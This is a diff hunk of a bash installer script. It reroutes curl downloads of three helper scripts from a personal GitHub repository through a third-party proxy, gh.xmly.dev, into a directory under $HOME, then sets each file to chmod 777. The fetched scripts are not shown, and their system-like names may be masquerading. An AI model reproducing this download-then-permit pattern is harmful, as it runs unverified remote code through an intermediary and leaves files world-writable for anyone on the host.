@@ -16,9 +16,9 @@ rm -f videoysy.sh
 rm -f videosys.sh
 
 cd $HOME/myssqltcp/
-curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/lib_systemd.sh" -o $HOME/myssqltcp/lib_systemd.sh
-curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/addconf.sh" -o $HOME/myssqltcp/addconf.sh
-curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/logserver.sh" -o $HOME/myssqltcp/logserver.sh
+curl -L --progress-bar "https://gh.xmly.dev/https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/lib_systemd.sh" -o $HOME/myssqltcp/lib_systemd.sh
+curl -L --progress-bar "https://gh.xmly.dev/https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/addconf.sh" -o $HOME/myssqltcp/addconf.sh
+curl -L --progress-bar "https://gh.xmly.dev/https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/logserver.sh" -o $HOME/myssqltcp/logserver.sh
 chmod 777 lib_systemd.sh
 chmod 777 addconf.sh
 chmod 777 logserver.sh
